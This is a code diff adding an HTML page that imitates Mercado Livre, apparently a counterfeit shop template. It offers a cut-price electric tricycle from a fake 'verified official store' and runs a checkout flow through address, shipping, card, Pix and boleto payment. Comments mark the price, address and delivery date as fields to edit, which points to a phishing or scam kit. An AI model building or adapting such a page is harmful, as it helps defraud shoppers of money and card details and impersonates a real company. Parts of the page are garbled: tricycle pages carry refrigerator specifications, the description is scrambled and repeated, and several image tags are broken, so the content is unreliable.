+            text-align: center;
+        }
+        .pix-info-alert {
+            background: #f5f5f5;
+            border-left: 4px solid #3483fa;
+            padding: 12px 16px;
+            margin: 20px 0;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            border-radius: 0 4px 4px 0;
+        }
+        .pix-btn-primary {
+            background: #3483fa;
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            border: none;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        .pix-link-secondary {
+            color: #3483fa;
+            text-decoration: none;
+            font-weight: 500;
+            display: block;
+            text-align: center;
+            font-size: 15px;
+        }
+
+
+        /* ===== RESPONSIVIDADE DESKTOP ===== */
+        /* Em telas maiores que 768px, o site se expande para preencher a tela toda */
+        @media (min-width: 769px) {
+
+            /* Wrapper geral - ocupa a tela toda */
+            body {
+                background-color: #f0f0f0;
+                overflow-x: hidden;
+            }
+
+            /* Todas as páginas principais expandem para 100% */
+            #productPage,
+            #checkoutPage,
+            #shippingPage,
+            #paymentPage,
+            #reviewPage,
+            #boletoPage,
+            #pixPage,
+            #new-card-page {
+                max-width: 100% !important;
+                width: 100% !important;
+                min-height: 100vh;
+            }
+
+            /* Ajuste para as páginas de fluxo no desktop */
+            #checkoutPage, #shippingPage, #paymentPage, #reviewPage, #new-card-page {
+                padding-top: 20px;
+                padding-bottom: 100px;
+            }
+
+            /* Página de produto: layout de duas colunas no desktop */
+            /* Usamos position:fixed para o carousel (coluna esquerda) e margin-right para o conteúdo */
+            #productPage {
+                max-width: 100% !important;
+                width: 100% !important;
+                background: #fff;
+                min-height: 100vh;
+            }
+
+            #productPage.page:not(.active) {
+                display: none !important;
+            }
+
+            /* Header movido para fora do productPage via JS no desktop */
+            #mainHeader.desktop-header {
+                max-width: 100% !important;
+                background-color: #FFD700 !important;
+                position: fixed !important;
+                top: 0 !important;
+                left: 0 !important;
+                right: 0 !important;
+                width: 100% !important;
+                z-index: 1000 !important;
+                height: 48px !important;
+                max-height: 48px !important;
+                overflow: hidden !important;
+            }
+
+            /* Coluna esquerda: carrossel fixo à esquerda */
+            #productPage .carousel-container {
+                position: fixed;
+                top: 64px;
+                left: 0;
+                width: calc(100% - 480px);
+                height: calc(100vh - 64px - 70px);
+                overflow: hidden;
+                background: #f8f8f8;
+                z-index: 10;
+            }
+
+            /* Imagens do carousel ocupam a altura do container */
+            #productPage .carousel-container .carousel-item img {
+                width: 100%;
+                height: calc(100vh - 64px - 70px);
+                object-fit: contain;
+                background: #f8f8f8;
+            }
+
+            /* Coluna direita: conteúdo com margem para não sobrepor o carousel */
+            #productPage > .p-4 {
+                position: fixed;
+                top: 64px;
+                right: 0;
+                width: 480px;
+                bottom: 70px;
+                padding: 24px 32px 40px;
+                overflow-y: auto;
+                border-left: 1px solid #eee;
+                scrollbar-width: thin;
+                scrollbar-color: #ddd transparent;
+                box-sizing: border-box;
+                background: #fff;
+                z-index: 5;
+            }
+
+            /* Navegação inferior: ocupa a largura toda no desktop */
+            #productPage .bottom-nav {
+                max-width: 100% !important;
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                border-top: 1px solid #eee;
+                background: white;
+                z-index: 50;
+                justify-content: center;
+                gap: 48px;
+            }
+
+            /* Garante que o conteúdo não fique atrás da bottom-nav nem do header nas páginas de fluxo */
+            #checkoutPage,
+            #shippingPage,
+            #paymentPage,
+            #reviewPage,
+            #boletoPage,
+            #pixPage,
+            #new-card-page {
+                padding-bottom: 80px;
+                padding-top: 64px;
+            }
+
+            /* Páginas de fluxo: layout centralizado no desktop */
+            #checkoutPage {
+                max-width: 700px !important;
+                margin: 0 auto !important;
+                padding: 0 32px 24px !important;
+                background-color: #f5f5f5;
+                min-height: 100vh;
+            }
+
+            #checkoutPage header {
+                max-width: 100%;
+                margin: 0 -32px;
+                background-color: #f5f5f5 !important;
+            }
+
+            #shippingPage > main,
+            #paymentPage > main {
+                max-width: 700px !important;
+                margin: 0 auto !important;
+                padding: 0 32px 24px !important;
+            }
+
+            /* Shipping page */
+            #shippingPage {
+                background-color: #f5f5f5;
+                min-height: 100vh;
+            }
+
+            #shippingPage header {
+                max-width: 700px;
+                margin: 0 auto;
+                background-color: #f5f5f5 !important;
+            }
+
+            #shippingPage > main {
+                padding-top: 0 !important;
+            }
+
+            .shipping-footer {
+                max-width: 700px !important;
+                left: 50% !important;
+                right: auto !important;
+                transform: translateX(-50%);
+                bottom: 64px !important;
+            }
+
+            .continue-btn {
+                max-width: 700px !important;
+                left: 50% !important;
+                right: auto !important;
+                transform: translateX(-50%);
+                width: calc(700px - 32px) !important;
+            }
+
+            /* Payment page */
+            #paymentPage {
+                background-color: #f5f5f5;
+                min-height: 100vh;
+            }
+
+            #paymentPage header {
+                max-width: 700px;
+                margin: 0 auto;
+                background-color: #f5f5f5 !important;
+            }
+
+            .payment-summary {
+                max-width: 700px !important;
+                left: 50% !important;
+                right: auto !important;
+                transform: translateX(-50%);
+            }
+
+            /* Review page */
+            #reviewPage {
+                background-color: #f5f5f5;
+                min-height: 100vh;
+            }
+
+            .review-header {
+                max-width: 100% !important;
+                padding: 1rem 0 !important;
+            }
+
+            .review-header > * {
+                max-width: 700px;
+                margin-left: auto;
+                margin-right: auto;
+                padding: 0 16px;
+            }
+
+            #reviewPage main {
+                max-width: 700px;
+                margin: 0 auto;
+            }
+
+            #fixedReviewFooter {
+                max-width: 700px !important;
+                left: 50% !important;
+                right: auto !important;
+                transform: translateX(-50%) translateY(200px) !important;
+            }
+
+            #fixedReviewFooter[style*="translateY(0)"] {
+                transform: translateX(-50%) translateY(0) !important;
+            }
+
+            .review-confirm-btn {
+                max-width: calc(700px - 32px) !important;
+                left: 50% !important;
+                right: auto !important;
+                transform: translateX(-50%) translateY(100px) !important;
+            }
+
+            .review-confirm-btn.visible {
+                transform: translateX(-50%) translateY(0) !important;
+            }
+
+            /* Boleto page */
+            #boletoPage {
+                background-color: #f5f5f5;
+                min-height: 100vh;
+            }
+
+            .boleto-hero,
+            .boleto-body {
+                max-width: 700px;
+                margin: 0 auto;
+            }
+
+            /* Pix page */
+            #pixPage {
+                background-color: #f5f5f5;
+                min-height: 100vh;
+            }
+
+            .pix-hero,
+            .pix-body {
+                max-width: 700px;
+                margin: 0 auto;
+            }
+
+            /* New card page */
+            #new-card-page main {
+                max-width: 700px !important;
+            }
+
+            #new-card-page header {
+                padding: 1rem 2rem !important;
+            }
+
+            /* Boleto header */
+            .boleto-header {
+                max-width: 700px;
+                margin: 0 auto;
+            }
+
+            .card-footer-nav {
+                max-width: 700px !important;
+                left: 50% !important;
+                right: auto !important;
+                transform: translateX(-50%);
+            }
+
+            /* Telas de loading: ocupam a tela toda */
+            .loading-page {
+                width: 100vw !important;
+                height: 100vh !important;
+                max-width: 100vw !important;
+                left: 0 !important;
+                top: 0 !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <!-- TELA DE ENTRADA (SPLASH SCREEN) -->
+    <div class="loading-page" id="splashScreen" style="background-color: #FFD700; z-index: 9999;">
+        <div class="img-circle-standard" style="width: 220px; height: 220px; border: none; background: transparent;">
+            <img src="img/mercadolivre-logo.png" alt="Logo do mercado livre">
+        </div>
+    </div>
+
+    <!-- TELA DE CARREGAMENTO INICIAL BRANCA -->
+    <div class="loading-page hidden" id="initialWhiteLoading" style="background-color: #ffffff; z-index: 9998;">
+        <div class="loading-spinner" style="animation: spin 0.9s linear infinite; border-top-color: #3483fa;"></div>
+    </div>
+
+    <!-- PÁGINA 1: PRODUTO -->
+        <main class="max-w-md mx-auto page" id="productPage">
+        <!-- Header com Transicao de Cor -->
+        <header class="flex items-center justify-between p-4" id="mainHeader">
+            <button class="text-gray-600"><i class="fas fa-arrow-left text-xl"></i></button>
+            <div class="flex space-x-2 text-gray-600">
+                <button id="searchBtn"><i class="fas fa-search"></i></button>
+                <button><i class="fab fa-whatsapp" style="font-weight: 900; -webkit-text-stroke: 0.5px currentColor;"></i></button>
+                <button id="shareBtn"><i class="fas fa-share-alt"></i></button>
+            </div>
+        </header>
+
+        <!-- Image Carousel -->
+        <div class="carousel-container relative">
+            <div class="carousel-track" id="carouselTrack">
+                <div class="carousel-item"><img src="img/Triciculo1.jpg alt="Geladeira 1" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo2.jpg alt="Geladeira 2" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo3.jpg" alt="Geladeira 3" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo4.jpg" alt="Geladeira 4" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo1.jpg alt="Geladeira 5" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo2.jpg" alt="Geladeira 6" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo3.jpg alt="Geladeira 7" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo4.jpg" alt="Geladeira 8" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo1.jpg alt="Geladeira 9" class="w-full h-auto"></div>
+                <div class="carousel-item"><img src="img/Triciculo1.jpg" alt="Geladeira 10" class="w-full h-auto"></div>
+            </div>
+            <!-- Setas de navegação do carousel (visíveis apenas no desktop) -->
+        <button id="carouselPrev" onclick="carouselGoTo(-1)" style="display:none; position:absolute; left:12px; top:50%; transform:translateY(-50%); z-index:20; background:rgba(255,255,255,0.85); border:none; border-radius:50%; width:44px; height:44px; font-size:20px; cursor:pointer; align-items:center; justify-content:center; box-shadow:0 2px 8px rgba(0,0,0,0.15);">‹</button>
+        <button id="carouselNext" onclick="carouselGoTo(1)" style="display:none; position:absolute; right:12px; top:50%; transform:translateY(-50%); z-index:20; background:rgba(255,255,255,0.85); border:none; border-radius:50%; width:44px; height:44px; font-size:20px; cursor:pointer; align-items:center; justify-content:center; box-shadow:0 2px 8px rgba(0,0,0,0.15);">›</button>
+
+        <!-- Card Loja Oficial - canto inferior esquerdo (Transparente) -->
+            <div style="position: absolute; bottom: 12px; left: 12px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(4px); border-radius: 20px; padding: 5px 10px 5px 6px; display: flex; align-items: center; gap: 5px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); z-index: 10;">
+                <div class="img-circle-standard" style="width: 18px; height: 18px; border: none; background: transparent;">
+                    <img src="img/eletrocenter.jpg" alt="foto da loja">
+                </div>
+                <span style="font-size: 11px; font-weight: 600; color: #3483fa; white-space: nowrap;">Loja Oficial EletroCenter</span>
+                <div class="img-circle-standard" style="width: 14px; height: 14px; border: none; background: transparent; margin-left: 2px;">
+                    <img src="img/verificado1.png" alt="verificado">
+                </div>
+            </div>
+            <!-- Card contador - canto inferior direito -->
+            <div style="position: absolute; bottom: 12px; right: 12px; background: rgba(0,0,0,0.55); border-radius: 20px; padding: 4px 10px; z-index: 10;">
+                <span style="font-size: 11px; font-weight: 600; color: #fff;"><span id="currentIndex">1</span>/10</span>
+            </div>
+        </div>
+
+
+
+        <div class="p-4">
+            <div class="flex items-center space-x-2 mb-2">
+                <span class="bg-orange-500 text-white text-[10px] font-bold px-1 py-0.5 rounded">MAIS VENDIDO</span>
+                <span class="text-blue-500 text-xs">2º em triciculo eletrico</span>
+            </div>
+
+            <div class="flex justify-between items-start">
+                <h1 class="text-lg font-normal text-gray-800 leading-tight">
+                    Triciculo Eletrico Branco 127/220v
+                </h1>
+                <button class="text-blue-500 border border-gray-200 p-2 rounded-full ml-2">
+                    <i class="far fa-heart text-xl"></i>
+                </button>
+            </div>
+
+            <div class="flex items-center mt-2 space-x-1">
+                <i class="fas fa-star text-blue-500 text-xs"></i>
+                <span class="text-blue-500 text-sm font-medium">4.8</span>
+                <span class="text-gray-400 text-sm">| +1000 vendidos</span>
+            </div>
+
+            <div class="mt-6">
+                <p class="text-gray-700 font-medium">Cor: <span class="font-normal">Cinza</span></p>
+                <div class="flex space-x-3 mt-2">
+                    <div class="border-2 border-blue-500 p-1 rounded-md">
+                        <img src="img/geladeira-cinza.webp" class="w-12 h-12 object-cover rounded" alt="Cinza">
+                    </div>
+                    <div class="border border-gray-200 p-1 rounded-md">
+                        <img src="img/geladeira-inox.webp" class="w-12 h-12 object-cover rounded opacity-50" alt="Outra cor">
+                    </div>
+                </div>
+            </div>
+
+            <div class="mt-6">
+                <p class="text-gray-700 font-medium"> Voltagem: <span class="font-bold">Escolha</span></p>
+                <div class="flex space-x-3 mt-2">
+                    <button class="btn-voltage active">127V</button>
+                    <button class="btn-voltage">220V</button>
+                </div>
+            </div>
+
+            <!-- edição do preço principal-->
+            <div class="mt-8">
+                <p class="text-4xl font-normal text-gray-800">R$ 1.800</p>
+                <p class="text-green-600 text-sm mt-1">10x R$ 180<sup>70</sup> sem juros</p>
+            </div>
+
+            <!-- Combine Meios de Pagamento -->
+            <div class="mt-6 border border-gray-200 rounded-lg p-4 flex items-center justify-between" id="combinePaymentCard">
+                <div class="flex items-center space-x-3">
+                    <div class="payment-icons-container" style="width: 62px;">
+                        <div class="payment-circle card-circle">
+                            <img src="img/cartao-icon.png" alt="Cartão de Pagamento">
+                        </div>
+                        <div class="payment-circle pix-circle" style="left: 24px;">
+                            <img src="img/pix-icon.png" alt="Pix">
+                        </div>
+                    </div>
+                    <div>
+                        <p class="text-sm font-medium text-gray-800">Combine meios de pagamento</p>
+                        <p class="text-[11px] text-gray-500">Pague com cartões de crédito, Pix e outras opções na mesma compra.</p>
+                    </div>
+                </div>
+                <i class="fas fa-chevron-right text-blue-500 text-xs"></i>
+            </div>
+
+            <!-- Meios de Pagamento -->
+            <div class="mt-4">
+                <div class="payment-methods-header">
+                    <p class="text-blue-500 text-sm font-medium">Meios de pagamento</p>
+                    <div class="payment-methods-circles">
+                    <div class="payment-method-circle" style="margin-left: 0;">
+                        <img src="img/pix-icon.png" alt="Bandeira 1">
+                    </div>
+                    <div class="payment-method-circle" style="margin-left: -4px;">
+                        <img src="img/mpagamento2.png" alt="Bandeira 2">
+                    </div>
+                    <div class="payment-method-circle" style="margin-left: -4px;">
+                        <img src="img/mpagamento3.jpg" alt="Bandeira 3">
+                    </div>
+                    <div class="payment-method-circle" style="margin-left: -4px;">
+                        <img src="img/mpagamento4.jpg" alt="Bandeira 4">
+                    </div>
+                    <div class="payment-method-circle" style="margin-left: -4px;">
+                        <img src="img/boleto-icon.png" alt="Bandeira 5">
+                    </div>
+                    <div class="payment-method-circle" style="margin-left: -4px;">
+                        <img src="img/mpagamento6.jpg" alt="Bandeira 6">
+                    </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Entrega -->
+            <div class="mt-6 border-t pt-4">
+                <p class="text-gray-800 font-medium">Chegará entre sexta-feira e segunda-feira 13/jul</p>
+                <p class="text-blue-500 text-sm mt-1">Mais detalhes e formas de entrega</p>
+            </div>
+
+            <!-- Estoque Disponível -->
+            <div class="mt-6 border-t pt-4">
+                <h3 class="text-gray-800 font-bold text-base mb-3">Estoque disponível</h3>
+                <div class="bg-gray-50 p-4 rounded-lg flex items-center justify-between mb-4">
+                    <div>
+                        <p class="text-gray-800 font-medium">Quantidade: <span class="font-bold">1</span></p>
+                        <p class="text-gray-400 text-sm">(+50 disponíveis)</p>
+                    </div>
+                    <i class="fas fa-chevron-right text-gray-400"></i>
+                </div>
+
+                <!-- Botões de Compra -->
+                <button class="w-full bg-blue-500 text-white font-bold py-3 rounded-lg mb-3 hover:bg-blue-600" id="buyBtn">
+                    Comprar agora
+                </button>
+
+                <!-- som de compra do mercado livre -->
+
+                <audio id="som-mercadolivre" scr="audio/som-mercadolivre.mp3"></audio>
+
+                <button class="w-full bg-blue-100 text-blue-500 font-bold py-3 rounded-lg flex items-center justify-center space-x-2 hover:bg-blue-200" id="addToCartBtn">
+                    <div class="img-circle-standard" style="width: 24px; height: 24px; border: none; background: transparent;">
+                        <img src="img/carrinhoazul.jpg" alt="Carrinho">
+                    </div>
+                    <span>Adicionar ao carrinho</span>
+                </button>
+            </div>
+
+            <!-- Informações da Loja -->
+            <div class="mt-6 border-t pt-4" id="officialStoreCard">
+                <div class="flex items-center space-x-3">
+                    <div class="img-circle-standard">
+                        <img src="img/eletrocenter.jpg" alt="Loja">
+                    </div>
+                    <div class="flex-1">
+                        <div class="flex items-center">
+                            <p class="text-gray-800 font-bold text-sm">Loja oficial EletroCenter</p>
+                            <img src="img/verificado1.png" alt="verificado1.png" style="width: 18px; height: 18px; border-radius: 50%; object-fit: cover; margin-left: 4px; flex-shrink: 0;">
+                        </div>
+                        <p class="text-gray-500 text-xs">Loja oficial</p>
+                        <p class="text-blue-500 text-xs font-medium mt-0.5">Visitar loja</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Produtos Relacionados -->
+            <div class="mt-6 border-t pt-6">
+                <h2 class="text-xl font-bold text-gray-800 mb-4">Você também pode gostar</h2>
+                <div class="flex gap-4" id="relatedProductCard">
+                    <div class="w-24 h-32 bg-gray-100 rounded-lg flex-shrink-0">
+                        <img src="img/geladeira-140.webp" alt="Geladeira 140L" class="w-full h-full object-cover rounded-lg">
+                    </div>
+                    <div class="flex-1">
+                        <p class="text-gray-800 font-bold text-base">Geladeira</p>
+                        <p class="text-gray-800 font-bold text-2xl mt-2">R$ 1.416</p>
+                        <p class="text-green-600 text-sm font-medium mt-1">10x R$ 141<sup>60</sup> sem juros</p>
+                        <p class="text-green-600 text-xs font-medium mt-2">Frete grátis por ser sua primeira compra</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Link para Loja Oficial -->
+            <div class="mt-6 border-t pt-4">
+                <p class="text-blue-500 text-sm font-medium flex items-center space-x-1">
+                    <i class="fas fa-arrow-right"></i>
+                    <span>Ir para a loja oficial</span>
+                </p>
+            </div>
+
+            <!-- Detalhes do Produto -->
+            <div class="mt-10 border-t pt-6">
+                <h2 class="text-xl font-bold text-gray-800 mb-4">Detalhes do produto</h2>
+                <div class="space-y-0">
+                    <div class="flex justify-between p-4 bg-gray-50">
+                        <span class="text-gray-700 font-medium">Marca</span>
+                        <span class="text-gray-800">HQ</span>
+                    </div>
+                    <div class="flex justify-between p-4">
+                        <span class="text-gray-700 font-medium">Modelo</span>
+                        <span class="text-gray-800">HQ-460SBSFF</span>
+                    </div>
+                    <div class="flex justify-between p-4 bg-gray-50">
+                        <span class="text-gray-700 font-medium">Cor</span>
+                        <span class="text-gray-800">Cinza</span>
+                    </div>
+                </div>
+                <p class="text-gray-800 text-sm mt-4 leading-relaxed">Geladeiefrigerador HQ Frost Free Side By Side 460 Litros Cinza HQ-4</p>
+                <p class="text-blue-500 text-sm font-medium mt-3">Ver mais detalhes</p>
+            </div>
+
+            <!-- Imagem Grande do Produto -->
+            <div class="mt-10 pb-20" id="largeProductImage">
+                <img src="img/Triciculo1.jpg alt="Geladeira Grande" class="w-full h-auto rounded-lg">
+            </div>
+
+            <div class="mt-10 pb-20" id="largeProductImage">
+                <img src="img/Triciculo2.jpg alt="Geladeira Grande" class="w-full h-auto rounded-lg">
+            </div>
+
+            <div class="mt-10 pb-20" id="largeProductImage">
+                <img src="img/Triciculo3.jpg alt="Geladeira Grande" class="w-full h-auto rounded-lg">
+            </div>
+
+            <div class="mt-10 pb-20" id="largeProductImage">
+                <img src="img/Triciculo4.jpgalt="Geladeira Grande" class="w-full h-auto rounded-lg">
+            </div>
+
+            <div class="mt-10 pb-20" id="largeProductImage">
+                <img src="img/Triciculo1.jpg alt="Geladeira Grande" class="w-full h-auto rounded-lg">
+            </div>
+
+
+            <!-- Descrição Original -->
+            <!-- Descrição Completa -->
+            <div class="mt-10 border-t pt-6">
+                <h2 class="text-xl font-medium mb-4">Descrição</h2>
+                <p class="text-gray-600 text-sm leading-relaxed" style="white-space: pre-line;">
+                    
+                    
+Triciclo Elétrico Branco 127/220VProporcione momentos inesquecíveis de diversão com o amento elegante e funcionamento práticoderno, acabamento elegante e funcionamentdas criaia recom conforto e segurança.Equipado com bateria recarregávedo facilmente emchualqueente e ré, proporcionando u por disso, conta com três rodas que oferecem uaior eambientes internos e externos, ode aliclq é fabricado cotindo durabilidade e tranquilidade para toda a família.**Destaques:*** ✅ Cor: Branco* ✅ Carregador cha à frente e re e ✅ Acvel com 3 rodas* ✅ Design moderno e ctefortável* ✅ Fácil montaequenos com versriciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!triciclo que une estilo, qualidade e praticidade!
+                
+
+
+</p>
+                <ul class="mt-4 space-y-2 text-sm text-gray-600">
+                    <li><i class="fas fa-check text-green-500 mr-2"></i> Tecnologia Frost Free (não precisa descongelar)</li>
+                    <li><i class="fas fa-check text-green-500 mr-2"></i> Capacidade Total: 460 Litros</li>
+                    <li><i class="fas fa-check text-green-500 mr-2"></i> Painel Digital Touch</li>
+                    <li><i class="fas fa-check text-green-500 mr-2"></i> Iluminação Interna em LED</li>
+                </ul>
+            </div>
+
+            <div class="mt-10 border-t pt-6">
+                <h2 class="text-xl font-medium mb-4">Características principais</h2>
+                <table class="w-full text-sm">
+                    <tr class="bg-gray-50">
+                        <td class="p-3 text-gray-500">Marca</td>
+                        <td class="p-3 text-gray-800">HQ</td>
+                    </tr>
+                    <tr>
+                        <td class="p-3 text-gray-500">Modelo</td>
+                        <td class="p-3 text-gray-800">HQ-460SBSFF</td>
+                    </tr>
+                    <tr class="bg-gray-50">
+                        <td class="p-3 text-gray-500">Capacidade total</td>
+                        <td class="p-3 text-gray-800">460 L</td>
+                    </tr>
+                    <tr>
+                        <td class="p-3 text-gray-500">Tipo de degelo</td>
+                        <td class="p-3 text-gray-800">Frost Free</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav" id="mainNav">
+            <div class="nav-item active" id="navHome">
+                <div class="nav-icon-wrapper">
+                    <div class="img-circle-standard" style="width: 28px; height: 28px; border: none; background: transparent;"><img src="img/inicio-icon.png" alt="Início"></div>
+                </div>
+                <span class="nav-label" style="color: #3483fa;">Início</span>
+            </div>
+            <div class="nav-item" id="navCategories">
+                <div class="nav-icon-wrapper">
+                    <div class="img-circle-standard" style="width: 28px; height: 28px; border: none; background: transparent;"><img src="img/categorias-icon.png" alt="Categorias"></div>
+                </div>
+                <span class="nav-label">Categorias</span>
+            </div>
+            <div class="nav-item" id="navCart">
+                <div class="nav-icon-wrapper">
+                    <div class="img-circle-standard" style="width: 28px; height: 28px; border: none; background: transparent;"><img src="img/carrinho-icon.png" alt="Carrinho"></div>
+                </div>
+                <span class="nav-label">Carrinho</span>
+            </div>
+            <div class="nav-item" id="navVideos">
+                <div class="nav-icon-wrapper">
+                    <div class="img-circle-standard" style="width: 28px; height: 28px; border: none; background: transparent;"><img src="img/video-icon.png" alt="Vídeos"></div>
+                </div>
+                <span class="nav-label">Vídeos</span>
+            </div>
+            <div class="nav-item" id="navMore">
+                <div class="nav-icon-wrapper">
+                    <div class="img-circle-standard" style="width: 28px; height: 28px; border: none; background: transparent;"><img src="img/mais-icon.png" alt="Mais"></div>
+                </div>
+                <span class="nav-label">Mais</span>
+            </div>
+        </nav>
+    </main>
+
+    <!-- PÁGINA 2: CHECKOUT -->
+    <main class="max-w-md mx-auto px-4 pt-6 pb-8 page checkout-page" id="checkoutPage">
+        <!-- Header para checkout -->
+        <header class="flex items-center justify-start p-4 sticky top-0 z-40" style="background-color: transparent; margin: -1rem -1rem 0 -1rem; padding: 1rem;">
+            <button class="text-gray-600" id="backBtn1"><i class="fas fa-arrow-left text-xl"></i></button>
+        </header>
+
+        <!-- Page Title -->
+        <h1 class="text-2xl font-bold text-gray-900 mb-6">Confira a forma de entrega</h1>
+
+        <!-- delivery option -->
+        <div class="delivery-card" id="deliveryCardClick">
+            <div class="delivery-card-header">
+                <div>
+                    <div class="delivery-card-title">Enviar para o endereço</div>
+
+                    <!-- modificar endereço-->
+
+                    <div class="delivery-card-address">
+                        Rua Antonio Rodrigues de Souza 114 Paulínia, São Paulo
+                    </div>
+                    <div class="delivery-card-type">Residencial</div>
+                </div>
+                <div class="text-right">
+                    <div class="delivery-card-price">R$ 00,00<span class="delivery-card-price-small">00</span></div>
+                    <i class="fas fa-chevron-right chevron-icon" style="margin-top: 8px; display: block;"></i>
+                </div>
+            </div>
+            <a href="#" class="delivery-card-link">Alterar ou escolher outro endereço</a>
+        </div>
+
+        <!-- Empty space for scrolling -->
+        <div class="h-96"></div>
+    </main>
+
+    <!-- PÁGINA 3: SHIPPING -->
+    <div class="page shipping-page" id="shippingPage">
+        <header class="flex items-center justify-start p-4 sticky top-0 z-40" style="background-color: transparent;">
+            <button class="text-gray-600" id="backBtn2"><i class="fas fa-arrow-left text-xl"></i></button>
+        </header>
+
+        <main class="max-w-md mx-auto">
+            <div class="shipping-header">
+                <h1 class="shipping-title">Confira quando sua compra chegará</h1>
+                <div class="shipping-location">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>Envio para todo o brasil</span>
+                </div>
+            </div>
+
+            <div class="px-4 pb-32">
+                <!-- Envio 1 -->
+                <div class="shipping-option-card">
+                    <div class="shipping-option-header">
+                        <div class="shipping-option-title">Envio 1</div>
+                        <div class="shipping-option-image">
+                            <img src="img/Triciculo1.jpg alt="Produto">
+                        </div>
+                    </div>
+                    <div class="shipping-option-details">
+                        <div class="shipping-radio active"></div>
+                        <div class="shipping-option-text">
+
+                            <!-- modificar data de entrega-->
+                            <div class="shipping-option-date">Entre os dias 13 e 14 de julho</div>
+                        </div>
+                        <div class="shipping-option-price">
+                            <div class="shipping-option-original-price">R$ 315<sup>99</sup></div>
+                            <!-- confirme a forma de entrega-->
+                            <div class="shipping-option-final-price">R$ 00,00<sup>00</sup></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer com Frete -->
+        <div class="shipping-footer">
+            <div>
+                <div class="shipping-footer-label">Frete</div>
+            </div>
+            <div class="shipping-footer-price">R$ 00,00<sup style="font-size: 14px;">00</sup></div>
+        </div>
+
+        <!-- Botão Continuar -->
+        <button class="continue-btn" id="continueBtn">Continuar</button>
+    </div>
+
+    <!-- PAGINA 4: PAGAMENTO -->
+    <div class="page payment-page" id="paymentPage">
+        <header class="flex items-center justify-start p-4 sticky top-0 z-40" style="background-color: transparent;">
+            <button class="text-gray-600" id="backBtn3"><i class="fas fa-arrow-left text-xl"></i></button>
+        </header>
+
+        <main class="max-w-md mx-auto">
+            <div class="payment-header">
+                <h1 class="payment-title">Escolha como pagar</h1>
+            </div>
+
+            <div class="px-4 pb-32">
+                <!-- Combinar meios de pagamento -->
+                <div class="combine-payment-card">
+                    <span class="combine-payment-text">Combinar 2 meios de pagamento</span>
+                    <div class="toggle-switch">
+                        <div class="toggle-circle"></div>
+                    </div>
+                </div>
+
+                <!-- Recomendados -->
+                <div class="payment-section-title">Recomendados</div>
+                
+                <div class="payment-method-item" id="newCardPaymentItem" style="cursor:pointer;">
+                    <div class="payment-method-icon">
+                        <img src="img/cartao-icon.png" alt="Cartão">
+                    </div>
+                    <div class="payment-method-content">
+                        <div class="payment-method-name">Novo cartão de crédito ou pré-pago</div>
+                    </div>
+                    <div class="payment-method-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+
+                <div class="payment-method-item" id="pixPaymentItem" style="cursor:pointer;">
+                    <div class="payment-method-icon">
+                        <img src="img/pix-icon.png" alt="Pix">
+                    </div>
+                    <div class="payment-method-content">
+                        <div class="payment-method-name">Pix</div>
+                        <div class="payment-method-desc">Aprovação imediata</div>
+                    </div>
+                    <div class="payment-method-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+
+                <!-- Mercado Pago -->
+                <div class="payment-section-title">Mercado Pago <i class="fas fa-credit-card" style="font-size: 16px; margin-left: 4px;"></i></div>
+                
+                <div class="payment-method-item" id="mercadoPagoPaymentItem" style="cursor:pointer;">
+                    <div class="payment-method-icon-placeholder">
+                        <img src="img/mp-icon.jpg" alt="Mercado Pago" class="payment-method-placeholder-img">
+                    </div>
+                    <div class="payment-method-content">
+                        <div class="payment-method-name">Saldo no Mercado Pago</div>
+                        <div class="payment-method-desc">Saldo: R$ 00.00</div>
+                    </div>
+                    <div class="payment-method-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+
+                <!-- Outros meios -->
+                <div class="payment-section-title">Outros meios de pagamento</div>
+                
+                <div class="payment-method-item" id="boletoPaymentItem" style="cursor:pointer;">
+                    <div class="payment-method-icon">
+                        <img src="img/boleto-icon.png" alt="Boleto">
+                    </div>
+                    <div class="payment-method-content">
+                        <div class="payment-method-name">Boleto</div>
+                        <div class="payment-method-desc">Aprovação em 1 a 2 dias úteis</div>
+                    </div>
+                    <div class="payment-method-arrow">
+                        <i class="fas fa-chevron-right"></i>
+                    </div>
+                </div>
+
+                <!-- Cupom -->
+                <a href="#" class="coupon-link">Inserir código do cupom</a>
+            </div>
+        </main>
+
+        <!-- Resumo de pagamento -->
+        <div class="payment-summary">
+            <div class="payment-summary-row">
+                <span class="payment-summary-label">Você pagará</span>
+                <span class="payment-summary-value">R$ 2.312<sup>99</sup></span>
+                <span style="font-weight: 700; font-size: 16px;">R$ 1.800<sup>00</sup></span>
+            </div>
+            <div class="payment-summary-discount">
+                Você economizou R$ 315<sup>99</sup>
+            </div>
+        </div>
+    </div>
+
+    <!-- TELA DE CARREGAMENTO RÁPIDO (entre transições) -->
